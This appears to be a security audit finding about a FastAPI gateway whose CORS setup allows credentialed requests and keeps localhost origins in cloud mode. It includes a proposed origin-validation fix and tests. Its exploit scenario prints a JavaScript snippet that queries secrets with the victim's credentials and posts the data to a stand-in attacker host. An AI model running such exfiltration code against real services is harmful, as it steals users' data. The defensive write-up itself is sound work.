# `allow_credentials=True` with origins read from `SP_ALLOWED_ORIGINS` env

- Slug: cors-allow-credentials-true-with-permissive-origin-list
- Severity: Medium
- Cloud impact: Yes
- Confidence: High
- Affected files / endpoints: `signalpilot/gateway/gateway/main.py:288-295`

Back to [issues.md](issues.md)

---

## Problem

The FastAPI CORS middleware is configured with `allow_credentials=True` and an origin list that defaults to include localhost in all modes:

```python
# main.py:288-295
app.add_middleware(
    CORSMiddleware,
    allow_origins=_ALLOWED_ORIGINS,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization", "X-API-Key", "X-Request-ID"],
    expose_headers=["X-Request-ID"],
    allow_credentials=True,  # Sends cookies with cross-origin requests
)
```

`_ALLOWED_ORIGINS` is built from `SP_ALLOWED_ORIGINS` env var, which defaults to `http://localhost:3000,http://localhost:3200` even when `SP_DEPLOYMENT_MODE=cloud`.

Problems:
1. **Localhost origins in cloud mode:** `allow_credentials=True` + `http://localhost:3000` in cloud mode means the gateway will accept cross-origin requests from a developer's local browser tab (`http://localhost:3000`). This is not a direct security issue, but it means any local service on port 3000 can make credentialed cross-origin requests to the cloud gateway.
2. **`allow_credentials=True` without strict origin validation:** Any origin listed in `SP_ALLOWED_ORIGINS` becomes trusted for credentialed requests. If an operator accidentally includes a customer-controlled subdomain, that domain can make requests with the user's session credentials.
3. **No enforcement of HTTPS for cloud origins:** HTTP origins can be listed without validation.
4. **CSRF surface:** Every trusted origin is a potential CSRF surface. Browsers will send cookies and auth headers to CORS-trusted origins.

Note: FastAPI does not support wildcard origins with `allow_credentials=True` (it would raise); the risk here is operator misconfiguration of the explicit list.

---

## Impact

- A misconfigured `SP_ALLOWED_ORIGINS` that includes an attacker-controlled domain → CSRF against authenticated users from that domain.
- Localhost origins in cloud mode are low risk (attacker must control a service on the victim's localhost) but add unnecessary attack surface.
- HTTP origins in `allow_credentials=True` configs allow credential theft via network MITM.

---

## Exploit scenario

1. Operator misconfigures: `SP_ALLOWED_ORIGINS=https://signalpilot.ai,https://customer-portal.acme.com` where `acme.com` is a customer-controlled domain.
2. Attacker compromises `customer-portal.acme.com`.
3. Attacker's JavaScript on that domain:

```javascript
// From customer-portal.acme.com — browser sends credentials because CORS allows it
fetch('https://gateway.signalpilot.ai/api/query', {
  method: 'POST',
  credentials: 'include',  // browser sends cookies/auth
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({connection_name: 'victim-conn', query: 'SELECT * FROM secrets'})
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify(data)}));
```

4. Gateway accepts the request (CORS trusted origin + credentials).
5. Query runs as the victim's Clerk session.

---

## Affected surface

- Files: `signalpilot/gateway/gateway/main.py:288-295`
- Endpoints: All gateway API endpoints (CORS applies to all)
- Auth modes: Cloud mode (and local mode with incorrect SP_ALLOWED_ORIGINS)

---

## Proposed fix

In cloud mode:
1. Remove localhost defaults.
2. Validate all origins are HTTPS.
3. Warn on non-`*.signalpilot.ai` origins.

```python
# main.py — updated _ALLOWED_ORIGINS:
def _build_allowed_origins() -> list[str]:
    raw = os.environ.get("SP_ALLOWED_ORIGINS", "")
    if is_cloud_mode():
        # No localhost defaults in cloud mode
        if not raw:
            return [
                "https://signalpilot.ai",
                "https://www.signalpilot.ai",
            ]
        origins = [o.strip() for o in raw.split(",") if o.strip()]
        validated = []
        for origin in origins:
            if not origin.startswith("https://"):
                logger.warning(
                    "CORS: HTTP origin '%s' not allowed in cloud mode (must be HTTPS). Skipping.",
                    origin
                )
                continue
            if not any(origin.endswith(s) for s in [".signalpilot.ai", "://signalpilot.ai"]):
                logger.warning(
                    "CORS: Non-signalpilot.ai origin '%s' — verify this is intentional.",
                    origin
                )
            validated.append(origin)
        return validated
    else:
        # Local mode: permissive
        if not raw:
            return ["http://localhost:3000", "http://localhost:3200"]
        return [o.strip() for o in raw.split(",") if o.strip()]
```

---

## Verification / test plan

**Unit tests:**
1. `test_cloud_mode_no_localhost_origins` — cloud mode, default env, assert localhost not in origins.
2. `test_cloud_mode_http_origin_excluded` — cloud mode with HTTP origin in SP_ALLOWED_ORIGINS, assert excluded.
3. `test_local_mode_localhost_allowed` — local mode, assert localhost in origins.

**Manual checklist:**
- In cloud mode, send cross-origin request from `http://localhost:3000`:
- Before fix: `Access-Control-Allow-Origin: http://localhost:3000` in response.
- After fix: no `Access-Control-Allow-Origin` (or CORS error).

---

## Rollout / migration notes

- Cloud deployments using the web frontend at a non-`signalpilot.ai` domain must set `SP_ALLOWED_ORIGINS` explicitly.
- Communicate to enterprise operators who may have custom domain setups.
- Rollback: revert `_build_allowed_origins()` function.
